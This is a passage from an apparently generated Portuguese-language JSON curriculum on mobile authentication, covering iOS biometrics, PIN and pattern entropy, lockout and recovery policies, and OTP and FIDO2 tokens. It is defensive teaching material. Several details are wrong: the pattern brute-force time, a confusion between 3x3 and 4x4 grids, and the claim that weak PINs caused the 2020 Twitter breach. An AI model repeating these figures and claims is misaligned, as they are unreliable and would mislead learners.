                                  "title": "Preparar o ambiente de desenvolvimento para iOS",
                                  "subSteps": [
                                    "Instale Xcode e crie um novo projeto SwiftUI ou UIKit.",
                                    "Configure um simulador iOS com suporte a Face ID ou Touch ID (iPhone XS+ para Face ID).",
                                    "Adicione a framework LocalAuthentication via import no código.",
                                    "Habilite Face ID/Touch ID nas configurações do simulador (Features > Face ID).",
                                    "Crie uma view de login básica."
                                  ],
                                  "verification": "Projeto compila e simulador permite autenticação biométrica nas configurações.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Xcode 14+",
                                    "Simulador iOS 16+",
                                    "Documentação Apple LocalAuthentication"
                                  ],
                                  "tips": "Use simulador para testes iniciais; hardware real é ideal para produção.",
                                  "learningObjective": "Configurar ambiente iOS para integração de autenticação biométrica.",
                                  "commonMistakes": [
                                    "Usar simulador sem habilitar biometria",
                                    "Esquecer import LocalAuthentication",
                                    "API level incompatível"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar LocalAuthentication framework no iOS",
                                  "subSteps": [
                                    "Crie uma função async para avaliar policy LAContext biometricType.",
                                    "Use context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: \"Autentique para acessar\").",
                                    "Trate success, failure e error no callback.",
                                    "Integre Keychain para armazenar dados sensíveis pós-autenticação.",
                                    "Adicione fallback para passcode com .deviceOwnerAuthentication."
                                  ],
                                  "verification": "Ao acionar login, prompt de Face ID/Touch ID aparece e autentica no simulador.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Código Swift de exemplo Apple",
                                    "Keychain Services docs"
                                  ],
                                  "tips": "Sempre forneça localizedReason claro para compliance com App Store.",
                                  "learningObjective": "Implementar autenticação biométrica segura no iOS com tratamento de erros.",
                                  "commonMistakes": [
                                    "Não checar canEvaluatePolicy antes",
                                    "Ignorar LAPolicy tipos",
                                    "Armazenar dados sem criptografia"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, gerenciar e otimizar autenticação biométrica cross-platform",
                                  "subSteps": [
                                    "Teste cenários: sucesso, falha, cancelamento, sem biometria disponível.",
                                    "Implemente gerenciamento: revogar, re-enroll em configurações do app.",
                                    "Otimize UX com animações e feedback haptic.",
                                    "Audite logs para vazamentos de privacidade.",
                                    "Deploy em dispositivo real e teste bateria/segurança."
                                  ],
                                  "verification": "Autenticação funciona em ambos OS, com fallback e sem crashes em edge cases.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Dispositivos reais Android/iOS",
                                    "Ferramentas de debug como Logcat/Console"
                                  ],
                                  "tips": "Use bibliotecas cross-platform como React Native Biometrics para apps híbridos.",
                                  "learningObjective": "Garantir robustez e usabilidade da autenticação biométrica em produção.",
                                  "commonMistakes": [
                                    "Não testar sem biometria",
                                    "Expor callbacks sensíveis",
                                    "Ignorar guidelines de privacidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app bancário móvel, integre biometria no login: usuário toca sensor, app autentica via BiometricPrompt (Android) ou Face ID (iOS), libera saldo sem senha, armazenando sessão segura por 5 minutos.",
                              "finalVerifications": [
                                "Prompt biométrico aparece corretamente em ambos Android e iOS.",
                                "Autenticação succeeds com biometria simulada/real e falha com cancelamento.",
                                "Dados sensíveis só acessíveis pós-autenticação.",
                                "Fallback para PIN/senha funciona sem biometria.",
                                "Não há logs de dados biométricos expostos.",
                                "App passa em testes de compilação e runtime sem erros."
                              ],
                              "assessmentCriteria": [
                                "Código segue APIs oficiais sem deprecações.",
                                "Tratamento completo de erros e edge cases.",
                                "Tempo de resposta < 2s e UX intuitiva.",
                                "Compliance com privacidade (no dados biométricos armazenados).",
                                "Funciona em múltiplos dispositivos/emuladores.",
                                "Documentação inline no código."
                              ],
                              "crossCurricularConnections": [
                                "Programação Mobile (Android/iOS dev).",
                                "UI/UX Design (feedback visual/haptic).",
                                "Privacidade e Ética em Dados.",
                                "Criptografia (Keychain/EncryptedPrefs).",
                                "Testes de Software (unit/integration)."
                              ],
                              "realWorldApplication": "Apps de banking (ex: Nubank), saúde (acesso a prontuários), e-commerce (pagamentos touchless), reduzindo fraudes em 90% e melhorando conveniência sem comprometer segurança."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.1.2",
                        "name": "Autenticação Baseada em Conhecimento (PIN e Padrões)",
                        "description": "Estudo dos métodos tradicionais de autenticação que dependem de informações conhecidas pelo usuário, como PIN numérico e padrões gráficos, com foco em segurança e usabilidade em ambientes móveis.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.2.1",
                            "name": "Comparar PIN e padrões gráficos",
                            "description": "Explicar diferenças entre autenticação por PIN (4-6 dígitos) e padrões (gestos em grade 3x3), incluindo força de segurança medida em entropia e suscetibilidade a ataques de força bruta.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos de PIN e Padrões Gráficos",
                                  "subSteps": [
                                    "Defina autenticação baseada em conhecimento e seus tipos principais.",
                                    "Descreva um PIN: sequência de 4-6 dígitos numéricos (0-9).",
                                    "Descreva um padrão gráfico: gesto conectando pontos em uma grade 3x3, sem repetir pontos.",
                                    "Identifique exemplos comuns em dispositivos móveis como Android.",
                                    "Liste vantagens iniciais de cada método (ex.: PIN é numérico e rápido; padrão é visual)."
                                  ],
                                  "verification": "Crie um diagrama comparativo simples com definições e exemplos de cada método.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta",
                                    "Dispositivo móvel com tela de bloqueio",
                                    "Diagramas impressos de grade 3x3"
                                  ],
                                  "tips": "Use desenhos para visualizar a grade 3x3; evite confundir com senhas alfanuméricas.",
                                  "learningObjective": "Compreender as definições fundamentais e contextos de uso de PIN e padrões gráficos.",
                                  "commonMistakes": [
                                    "Confundir padrões com swipe simples",
                                    "Assumir que PINs podem ter letras",
                                    "Ignorar restrições de repetição em padrões"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular a Entropia de Segurança de um PIN",
                                  "subSteps": [
                                    "Recapitule entropia como medida de incerteza/informação (bits).",
                                    "Calcule espaço de possibilidades para PIN de 4 dígitos: 10^4 = 10.000.",
                                    "Para 6 dígitos: 10^6 = 1.000.000.",
                                    "Aplique fórmula de entropia: log2(N), onde N é o número de combinações possíveis.",
                                    "Compare entropia: ~13.3 bits (4 dígitos) vs. ~19.9 bits (6 dígitos)."
                                  ],
                                  "verification": "Resolva exercícios: calcule entropia para PIN de 5 dígitos e anote o resultado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora",
                                    "Tabela de logaritmos em base 2",
                                    "Planilha Excel ou Google Sheets para cálculos"
                                  ],
                                  "tips": "Use log2(10) ≈ 3.32 para simplificar cálculos manuais.",
                                  "learningObjective": "Dominar o cálculo de entropia para PINs e interpretar seus valores de segurança.",
                                  "commonMistakes": [
                                    "Usar log10 em vez de log2",
                                    "Contar permutações como combinações",
                                    "Ignorar dígitos repetidos permitidos em PIN"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular a Entropia de Segurança de Padrões Gráficos",
                                  "subSteps": [
                                    "Desenhe uma grade 3x3 e liste regras: 4-9 pontos, conexões adjacentes, sem repetições.",
                                    "Calcule combinações possíveis: aproximadamente 389.112 para padrões válidos (use referências padrão).",
                                    "Aplique fórmula de entropia: log2(389.112) ≈ 18.5 bits.",
                                    "Considere comprimentos variáveis: entropia média ~17-20 bits.",
                                    "Compare com PIN de 4 dígitos: padrão geralmente superior em entropia.",
                                    "verification"
                                  ],
                                  "verification": "Liste 5 padrões válidos e calcule entropia aproximada para um conjunto de 100 padrões simulados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel quadriculado para grades 3x3",
                                    "Software de simulação de padrões (ex.: app Android desenvolvedor)",
                                    "Referência: estudo 'Patterns in the Wild'"
                                  ],
                                  "tips": "Simule padrões em papel para validar regras de conexão (incluindo 'knight moves' em alguns sistemas).",
                                  "learningObjective": "Calcular e interpretar entropia de padrões gráficos com precisão.",
                                  "commonMistakes": [
                                    "Permitir repetições de pontos",
                                    "Contar padrões inválidos como diagonais não-adjacentes",
                                    "Subestimar número total de padrões válidos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar Suscetibilidade a Ataques de Força Bruta e Concluir",
                                  "subSteps": [
                                    "Explique brute force: tentativa sistemática de todas combinações.",
                                    "Calcule tempo estimado: divida combinações por taxa de tentativa (ex.: 10/s).",
                                    "Compare: PIN 4 dígitos (~17 min) vs. Padrão (~10 dias).",
                                    "Discuta fatores adicionais: shoulder surfing (padrão mais visível), smudge attacks.",
                                    "Conclua: padrões ligeiramente mais seguros por entropia, mas PINs mais resistentes a observação."
                                  ],
                                  "verification": "Crie tabela comparativa com entropia, tempo brute force e riscos adicionais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora",
                                    "Tabela de comparação pré-formatada",
                                    "Vídeos demonstrativos de ataques"
                                  ],
                                  "tips": "Assuma taxas realistas de tentativa baseadas em estudos (ex.: 3-5/s para padrões devido a gestos).",
                                  "learningObjective": "Analisar e comparar forças de segurança entre PIN e padrões em cenários de ataque.",
                                  "commonMistakes": [
                                    "Ignorar delays entre tentativas em dispositivos reais",
                                    "Superestimar velocidade de brute force em padrões",
                                    "Não considerar ataques não-brute force"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um smartphone Android bloqueado, configure um PIN de 4 dígitos e um padrão de 5 pontos. Tente 'quebrá-los' simulando brute force com um amigo cronometrando tentativas lentas (1/s). Calcule entropia teórica e compare tempo real vs. teórico, notando smudges na tela para padrões.",
                              "finalVerifications": [
                                "Calcula corretamente entropia de PIN 4-6 dígitos e padrão 3x3.",
                                "Explica diferenças em suscetibilidade a brute force com números.",
                                "Identifica pelo menos 3 riscos adicionais além de entropia (ex.: shoulder surfing).",
                                "Cria tabela comparativa precisa.",
                                "Discute quando usar cada método em contextos reais.",
                                "Responde perguntas sobre trade-offs de usabilidade vs. segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de entropia (±5% de erro aceitável).",
                                "Compreensão conceitual demonstrada em explicações claras.",
                                "Uso correto de terminologia (entropia, brute force, shoulder surfing).",
                                "Profundidade na comparação, incluindo fatores não-numéricos.",
                                "Criatividade e relevância no exemplo prático.",
                                "Capacidade de sintetizar conclusões acionáveis."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidade, logaritmos e teoria da informação.",
                                "Design de UX/UI: Ergonomia de gestos vs. digitação.",
                                "Física/Química: Análise de smudges (rastros oleosos na tela).",
                                "Estatística: Modelagem de ataques baseados em dados empíricos.",
                                "Ética: Implicações de privacidade em autenticação."
                              ],
                              "realWorldApplication": "Em desenvolvimento de apps móveis, escolha PIN para alta portabilidade (teclados virtuais) ou padrões para usuários visuais; em auditorias de segurança, recomende PIN 6 dígitos ou biometria sobre padrões devido a vulnerabilidades observadas em estudos como o Google Android Pattern Lock."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.2.2",
                            "name": "Aplicar melhores práticas para criação de credenciais",
                            "description": "Definir diretrizes para criação segura de PIN e padrões, como evitar sequências óbvias, usar comprimento mínimo e combinar com bloqueio após tentativas falhas (ex.: 5 tentativas no Android).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os princípios fundamentais de credenciais seguras",
                                  "subSteps": [
                                    "Estude definições de PIN (Personal Identification Number) e padrões de desbloqueio em dispositivos móveis.",
                                    "Analise riscos de credenciais fracas, como adivinhação ou ataques de força bruta.",
                                    "Revise exemplos de credenciais ruins: sequências como 1234, 0000, datas de nascimento ou padrões geométricos simples.",
                                    "Identifique requisitos mínimos: comprimento de pelo menos 6 dígitos para PIN e padrões complexos com curvas e zigzags.",
                                    "Pesquise padrões da indústria, como NIST SP 800-63B para autenticação."
                                  ],
                                  "verification": "Resuma os princípios em um documento de 1 página e liste 5 riscos associados a credenciais fracas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação NIST, artigos sobre segurança móvel, exemplos de PINs fracos online.",
                                  "tips": "Use diagramas para visualizar padrões fracos vs. fortes.",
                                  "learningObjective": "Entender os riscos e fundamentos de credenciais seguras em autenticação baseada em conhecimento.",
                                  "commonMistakes": "Confundir PIN com senhas alfanuméricas ou ignorar contextos móveis específicos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir diretrizes claras para criação de PIN e padrões fortes",
                                  "subSteps": [
                                    "Estabeleça comprimento mínimo: 6 dígitos para PIN, 4x4 grid com pelo menos 5 pontos para padrões.",
                                    "Proíba sequências óbvias: números consecutivos, repetidos ou padrões lineares/colunares.",
                                    "Exija diversidade: combinação de números altos/baixos, evitar datas pessoais.",
                                    "Para padrões: obrigue uso de nós não adjacentes, curvas e interseções.",
                                    "Crie uma lista de verificação para validação automática durante criação."
                                  ],
                                  "verification": "Crie um template de diretrizes com exemplos permitidos e proibidos; teste com 10 PINs simulados.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Editor de texto, simulador de padrões Android/iOS (apps como Pattern Lock Simulator).",
                                  "tips": "Priorize usabilidade: fortes mas memorizáveis.",
                                  "learningObjective": "Formular regras específicas que equilibrem segurança e usabilidade.",
                                  "commonMistakes": "Definir regras muito restritivas que frustrem usuários legítimos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar políticas de bloqueio após tentativas falhas",
                                  "subSteps": [
                                    "Defina limite de tentativas: 5 falhas consecutivas para bloqueio temporário (ex.: 30 segundos).",
                                    "Configure escalonamento: 3 falhas = 30s, 5 = 1min, 10 = wipe ou reset.",
                                    "Integre com autenticação secundária: biometria após bloqueio.",
                                    "Teste em emulador Android: configure lock screen com políticas personalizadas.",
                                    "Documente recuperação: uso de conta Google/Apple para reset."
                                  ],
                                  "verification": "Simule 5 tentativas falhas em um dispositivo/emulador e confirme bloqueio.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Emulador Android Studio, dispositivo móvel real, documentação developer.android.com.",
                                  "tips": "Use ADB para reset rápido durante testes.",
                                  "learningObjective": "Aplicar mecanismos de defesa contra brute-force em autenticação móvel.",
                                  "commonMistakes": "Definir bloqueios muito curtos que permitam ataques automatizados."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, documentar e disseminar as melhores práticas",
                                  "subSteps": [
                                    "Realize auditoria: teste diretrizes com grupo de 5 pessoas simulando criação.",
                                    "Crie guia visual: infográfico com DOs e DON'Ts para PIN/padrões.",
                                    "Integre em política de segurança: combine com treinamentos para usuários.",
                                    "Avalie conformidade com padrões como Android Keystore ou iOS Secure Enclave.",
                                    "Publique ou compartilhe o guia em repositório ou app de treinamento."
                                  ],
                                  "verification": "Obtenha feedback de pelo menos 3 pares confirmando clareza e efetividade.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramentas de design como Canva, formulário Google para feedback.",
                                  "tips": "Inclua QR code no guia para testes interativos.",
                                  "learningObjective": "Garantir adoção prática das diretrizes por meio de documentação e validação.",
                                  "commonMistakes": "Documentar sem exemplos visuais, reduzindo compreensão."
                                }
                              ],
                              "practicalExample": "Em um app bancário móvel, configure PIN de 6 dígitos (ex.: 748291, não 123456) e padrão 4x4 com zigzags (evitando L ou quadrados). Após 5 tentativas erradas, bloqueie por 1 minuto e exija biometria.",
                              "finalVerifications": [
                                "PIN/padrão criado atende a todas as diretrizes de força.",
                                "Bloqueio ativa corretamente após 5 tentativas falhas.",
                                "Usuário consegue criar e lembrar credencial sem erros comuns.",
                                "Guia de diretrizes é claro e inclui exemplos visuais.",
                                "Testes simulam cenários de ataque sem sucesso.",
                                "Integração com autenticação secundária funciona."
                              ],
                              "assessmentCriteria": [
                                "Diretrizes cobrem comprimento, diversidade e proibições específicas (80% cobertura).",
                                "Mecanismo de bloqueio é escalonado e realista (ex.: 5 tentativas).",
                                "Documentação é acionável com verificações e exemplos (nota >8/10).",
                                "Testes demonstram resistência a brute-force básica.",
                                "Equilíbrio entre segurança e usabilidade é evidenciado.",
                                "Conformidade com padrões Android/iOS é referenciada."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Cálculo de entropia e combinações possíveis em PIN/padrões.",
                                "Educação Digital: Treinamento em conscientização de segurança para usuários.",
                                "Desenvolvimento de Software: Implementação em APIs de autenticação móvel.",
                                "Ética e Privacidade: Discussão sobre coleta de dados de falhas de autenticação."
                              ],
                              "realWorldApplication": "Em empresas, essas práticas protegem dados corporativos em BYOD (Bring Your Own Device), reduzindo riscos de acesso não autorizado em apps de email, banking ou saúde, conforme visto em breaches como o do Twitter em 2020 onde PINs fracos facilitaram acessos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.2.3",
                            "name": "Gerenciar recuperação e bloqueio de autenticação",
                            "description": "Descrever mecanismos de recuperação de PIN perdido (via conta Google/Apple ID) e políticas de bloqueio temporário ou wipe de dados após múltiplas falhas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Mecanismos de Recuperação de PIN via Contas Google/Apple",
                                  "subSteps": [
                                    "Pesquise a documentação oficial do Android (Google) sobre recuperação de PIN usando Conta Google.",
                                    "Estude o processo de recuperação no iOS via Apple ID, incluindo etapas de verificação de identidade.",
                                    "Compare diferenças entre Android e iOS em termos de segurança e requisitos.",
                                    "Anote fluxos de recuperação, incluindo autenticação de dois fatores (2FA).",
                                    "Identifique cenários onde recuperação falha (ex.: sem acesso à conta vinculada)."
                                  ],
                                  "verification": "Crie um diagrama de fluxo resumindo os processos de recuperação para Android e iOS.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial Google/Android Developers",
                                    "Documentação Apple Support",
                                    "Ferramenta de diagrama como Draw.io ou papel e caneta"
                                  ],
                                  "tips": "Use termos técnicos precisos como 'chave de criptografia de dispositivo' para melhor compreensão.",
                                  "learningObjective": "Explicar com precisão os mecanismos de recuperação de autenticação em dispositivos móveis.",
                                  "commonMistakes": [
                                    "Confundir recuperação de PIN com reset de fábrica",
                                    "Ignorar requisitos de 2FA",
                                    "Não considerar bloqueios regionais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Recuperação de Autenticação em Dispositivos Móveis",
                                  "subSteps": [
                                    "Vincule uma Conta Google a um dispositivo Android em Configurações > Segurança > PIN.",
                                    "No iOS, ative 'ID Apple & Senha' em Ajustes > Face ID e Código > Alterar Código.",
                                    "Configure 2FA na conta Google/Apple para recuperação segura.",
                                    "Teste a configuração criando um PIN temporário e verificando opções de recuperação.",
                                    "Documente as telas de configuração com capturas de tela."
                                  ],
                                  "verification": "Simule perda de acesso e confirme que recuperação via conta está disponível sem wipe.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Dispositivo Android/iOS real ou emulador (Android Studio/Xcode)",
                                    "Conta Google/Apple ativa com 2FA"
                                  ],
                                  "tips": "Sempre use uma conta de teste para evitar bloqueios em contas principais.",
                                  "learningObjective": "Configurar corretamente recuperação de PIN em ambos os ecossistemas móveis.",
                                  "commonMistakes": [
                                    "Não ativar 2FA antes da configuração",
                                    "Usar PIN fraco durante testes",
                                    "Esquecer de sincronizar conta"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Políticas de Bloqueio Temporário e Wipe de Dados",
                                  "subSteps": [
                                    "Configure tentativas de PIN no Android via Configurações > Segurança > Bloqueio de tela (ex.: 5 tentativas para bloqueio temporário).",
                                    "No iOS, defina 'Apagar Dados' após 10 tentativas em Ajustes > Face ID e Código.",
                                    "Use MDM (Mobile Device Management) como teste com Google Workspace ou Apple Business Manager para políticas empresariais.",
                                    "Defina políticas: bloqueio de 1min após 3 falhas, wipe após 10.",
                                    "Registre logs de configuração em um documento."
                                  ],
                                  "verification": "Aplique configurações e confirme ativação via tentativas simuladas de PIN incorreto.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Dispositivo móvel",
                                    "Conta MDM gratuita (ex.: Google Endpoint Management trial)",
                                    "Ferramenta de log como Notas app"
                                  ],
                                  "tips": "Comece com bloqueios curtos para testes rápidos e evite wipe acidental.",
                                  "learningObjective": "Aplicar políticas de bloqueio e wipe para mitigar ataques de força bruta.",
                                  "commonMistakes": [
                                    "Definir tentativas muito baixas para testes",
                                    "Não backup dados antes de wipe",
                                    "Ignorar políticas de MDM"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Recuperação e Bloqueio em Cenários Reais",
                                  "subSteps": [
                                    "Simule perda de PIN: insira incorretamente X vezes para acionar bloqueio.",
                                    "Recupere via Google/Apple sem wipe e verifique integridade de dados.",
                                    "Teste wipe simulado em emulador e confirme perda de dados não essenciais.",
                                    "Analise logs de segurança do dispositivo pós-teste.",
                                    "Crie relatório de teste com resultados e lições aprendidas."
                                  ],
                                  "verification": "Relatório assinado confirmando sucesso em recuperação e ativação de bloqueio/wipe.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Emulador móvel",
                                    "Dispositivo de teste com dados fictícios",
                                    "Ferramenta de relatório como Google Docs"
                                  ],
                                  "tips": "Use dados falsos para simular wipe e capture vídeo do processo para prova.",
                                  "learningObjective": "Validar end-to-end os mecanismos de gerenciamento de autenticação.",
                                  "commonMistakes": [
                                    "Não resetar dispositivo após wipe",
                                    "Testar em dispositivo principal",
                                    "Ignorar análise de logs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um smartphone Android corporativo perdido, após 5 tentativas falhas de PIN, o dispositivo bloqueia por 5 minutos. O usuário acessa sua Conta Google via outro dispositivo, verifica identidade com 2FA e reseta o PIN remotamente sem perda de dados. Em caso de 10 falhas, wipe automático apaga dados sensíveis.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo de recuperação via Google/Apple.",
                                "Demonstrar configuração de bloqueio em dispositivo real/emulador.",
                                "Simular 5 falhas de PIN e mostrar ativação de bloqueio temporário.",
                                "Executar recuperação bem-sucedida sem wipe.",
                                "Descrever políticas de wipe e provar com teste.",
                                "Apresentar relatório com capturas de tela e logs."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de mecanismos (90%+ correção).",
                                "Sucesso completo na configuração e testes (sem erros fatais).",
                                "Relatório detalhado com evidências visuais.",
                                "Compreensão de diferenças Android/iOS.",
                                "Identificação de pelo menos 3 riscos de segurança.",
                                "Tempo de execução dentro do estimado (±20%)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Chaves de dispositivo protegidas por PIN.",
                                "Administração de Sistemas: Políticas MDM para frotas.",
                                "Privacidade de Dados: Conformidade com GDPR/HIPAA em wipes.",
                                "Desenvolvimento de Apps: Integração de autenticação em apps móveis.",
                                "Ética em TI: Balanceamento entre usabilidade e segurança."
                              ],
                              "realWorldApplication": "Em ambientes corporativos, gerentes de TI usam esses mecanismos para proteger dados em dispositivos móveis roubados, permitindo recuperação remota para funcionários e wipe automático para prevenir vazamentos, reduzindo riscos em BYOD (Bring Your Own Device)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.1.3",
                        "name": "Tokens de Autenticação e Controle de Autorização",
                        "description": "Análise de tokens de hardware/software (ex.: TOTP, FIDO) para autenticação multifator e modelos de controle de acesso em dispositivos móveis para gerenciar permissões de aplicativos e usuários.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.3.1",
                            "name": "Explicar tokens de autenticação móvel",
                            "description": "Detalhar tipos de tokens como hardware (YubiKey), software (Google Authenticator) e baseados em padrões FIDO2/U2F/WebAuthn, incluindo geração de códigos OTP dinâmicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Básicos de Tokens de Autenticação Móvel",
                                  "subSteps": [
                                    "Defina o que são tokens de autenticação e sua importância na segurança móvel.",
                                    "Explique o conceito de autenticação de dois fatores (2FA) e como tokens se integram.",
                                    "Diferencie tokens estáticos de dinâmicos, focando em OTP (One-Time Password).",
                                    "Descreva o fluxo básico: registro do token no serviço e geração de código para login.",
                                    "Identifique riscos sem tokens, como roubo de senhas."
                                  ],
                                  "verification": "Resuma em 3 frases os conceitos básicos e o fluxo de autenticação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook ou tablet",
                                    "Vídeo introdutório sobre 2FA (ex: YouTube - 'What is 2FA')",
                                    "Papel e caneta para anotações"
                                  ],
                                  "tips": "Use diagramas simples para visualizar o fluxo cliente-servidor.",
                                  "learningObjective": "Compreender os fundamentos de tokens como camada extra de segurança em autenticações móveis.",
                                  "commonMistakes": [
                                    "Confundir tokens com senhas",
                                    "Ignorar o papel do tempo na geração dinâmica",
                                    "Subestimar ataques de phishing"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Tokens de Software como Google Authenticator",
                                  "subSteps": [
                                    "Instale e configure o Google Authenticator em um dispositivo móvel simulado.",
                                    "Registre um token no app escaneando um QR code de um serviço teste (ex: GitHub 2FA demo).",
                                    "Gere e valide um código OTP, observando o contador de tempo (30 segundos).",
                                    "Explique o algoritmo TOTP (Time-based One-Time Password) por trás.",
                                    "Teste falhas intencionais, como alterar o relógio do dispositivo."
                                  ],
                                  "verification": "Gere um código OTP válido e explique por que ele muda a cada 30 segundos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "App Google Authenticator (Android/iOS)",
                                    "Conta teste em serviço com 2FA (ex: GitHub)",
                                    "Emulador de celular se necessário"
                                  ],
                                  "tips": "Sincronize o relógio do dispositivo para evitar códigos inválidos.",
                                  "learningObjective": "Dominar o funcionamento prático de tokens de software baseados em TOTP.",
                                  "commonMistakes": [
                                    "Não sincronizar tempo do dispositivo",
                                    "Perder o seed secreto",
                                    "Confundir HOTP com TOTP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Tokens de Hardware como YubiKey",
                                  "subSteps": [
                                    "Descreva características físicas e protocolos suportados pelo YubiKey (USB/NFC).",
                                    "Simule inserção/tocada para autenticação em um serviço compatível.",
                                    "Compare com software: vantagens em portabilidade e resistência a malware.",
                                    "Explique modos: OTP, U2F e FIDO2 no contexto móvel via NFC.",
                                    "Discuta cenários de uso móvel, como pareamento com smartphones."
                                  ],
                                  "verification": "Liste 3 vantagens do YubiKey sobre apps de software e demonstre um fluxo NFC simulado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Imagem ou vídeo de YubiKey",
                                    "Site oficial Yubico para demos",
                                    "Smartphone com NFC"
                                  ],
                                  "tips": "Pesquise demos NFC no YouTube para visualização prática.",
                                  "learningObjective": "Compreender tokens hardware como solução mais segura para autenticação móvel.",
                                  "commonMistakes": [
                                    "Ignorar suporte NFC para mobile",
                                    "Confundir YubiKey com chaves SSH",
                                    "Subestimar custo vs. benefício"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar Padrões FIDO2/U2F/WebAuthn e Geração de OTP Dinâmicos",
                                  "subSteps": [
                                    "Explique U2F como predecessor: desafio-resposta sem compartilhamento de segredos.",
                                    "Descreva FIDO2/WebAuthn: autenticação sem senha via chaves públicas/privadas.",
                                    "Detalhe geração OTP dinâmicos: HMAC-SHA1 com seed e contador/tempo.",
                                    "Compare todos os tipos em uma tabela: software vs. hardware vs. padrões.",
                                    "Discuta integração móvel: biometria + WebAuthn em browsers como Chrome."
                                  ],
                                  "verification": "Crie uma tabela comparativa com 4 colunas (Tipo, Mecanismo, Vantagens, Limitações).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Documentação FIDO Alliance (fidoalliance.org)",
                                    "Ferramenta online WebAuthn demo (webauthn.io)",
                                    "Planilha para tabela"
                                  ],
                                  "tips": "Use ferramentas online para testar WebAuthn sem hardware real.",
                                  "learningObjective": "Integrar conhecimentos sobre padrões modernos e mecanismos criptográficos de OTP.",
                                  "commonMistakes": [
                                    "Confundir FIDO2 com OTP tradicional",
                                    "Ignorar chaves assimétricas em WebAuthn",
                                    "Não mencionar resistências a phishing"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure 2FA no GitHub usando Google Authenticator: escaneie QR, gere OTP para login, depois simule migração para YubiKey NFC em um Android, validando com WebAuthn em um site de teste.",
                              "finalVerifications": [
                                "Liste e diferencie 3 tipos de tokens com exemplos reais.",
                                "Explique o algoritmo TOTP com um exemplo numérico simples.",
                                "Descreva um fluxo completo de autenticação FIDO2 em mobile.",
                                "Identifique 2 vulnerabilidades por tipo e mitigações.",
                                "Crie um diagrama de fluxo para geração OTP dinâmico.",
                                "Compare tokens em termos de usabilidade e segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nos conceitos de OTP, TOTP e padrões FIDO (30%)",
                                "Profundidade nos sub-passos e exemplos práticos (25%)",
                                "Clareza na diferenciação de tipos de tokens (20%)",
                                "Uso correto de verificações e dicas práticas (15%)",
                                "Conexões com aplicações reais e segurança móvel (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Algoritmos HMAC-SHA1 e chaves assimétricas.",
                                "Redes: Protocolos HTTPS e desafios cliente-servidor.",
                                "Programação: Implementação de TOTP em Python/JavaScript.",
                                "Hardware/Embarcados: Integração NFC em dispositivos IoT.",
                                "Ética em TI: Privacidade em autenticações biométricas."
